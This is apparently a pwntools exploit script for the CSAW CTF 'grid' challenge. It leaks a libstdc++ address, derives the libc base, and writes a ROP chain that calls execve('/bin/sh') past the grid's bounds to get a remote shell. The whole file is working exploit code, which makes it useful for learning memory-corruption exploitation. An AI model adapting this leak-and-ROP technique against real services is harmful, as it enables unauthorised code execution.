from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
binary = './grid'

bin = ELF(binary)
libc = ELF('./libc-2.27.so')
libstdc = ELF('./libstdc.so.6.0.25')


conn = remote("pwn.chal.csaw.io", 5013)
# conn = remote('127.0.0.1', 4444)
# gdb.attach(target=('127.0.0.1', 1234), gdbscript='''
# break *0x400b34
# continue
# ''', exe=binary)

store_cnt = 1

def store(v, r, c):
    print(conn.recvuntil(b"shape> "), end="")
    conn.sendline(v)
    print(v)

    print(conn.recvuntil(b"loc> "), end="")
    payload = f"{r} {c}".encode('utf-8')
    conn.sendline(payload)
    print(payload)

    global store_cnt
    store_cnt += 1

for i in range(0x8):
    store('a', 0, i)
    store('b', 0, i + 8)
    store('c', 0, i + 0x10)


print(conn.recvuntil(b"shape> ").decode('utf-8'), end="")
conn.sendline('d')
print('d')

print(conn.recvline()) # displaying
print(conn.recvline()) # a8 b2
print(conn.recvline()) # b6 c4
part1 = conn.recvline()[4:-1] # c4 x6
part2 = conn.recvline()[:2] # x2 r8
leak_addr = u64(part1 + part2)
print(f"Leaked Addr: {hex(leak_addr)}")

libstdc_base = leak_addr - 0xfb59a
# libc_base = libstdc_base + 0x389000
libc_base = libstdc_base - 0x3f1000
print(f"Libstdc Base: {hex(libstdc_base)}")
print(f"Libc Base: {hex(libc_base)}")

system_got = libc_base + libc.symbols["system"]
execve_got = libc_base + libc.symbols["execve"]
libc_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = b""
payload += p64(libc_base + 0x2155f) # pop rdi
payload += p64(libc_sh) # /bin/sh
payload += p64(libc_base + 0x1b96) # pop rdx
payload += p64(0x0)
payload += p64(libc_base + 0x23e8a) # pop rsi
payload += p64(0x0)
payload += p64(execve_got)
# payload += p64(system_got) # system call

for i in range(len(payload)):
    store(chr(payload[i]), 0, i + 0x78)

while store_cnt < 99:
    store('0', 0, 0)

print(conn.recvuntil(b"shape> ").decode('utf-8'), end="")
conn.sendline('d')
print('d')

conn.interactive()
conn.close()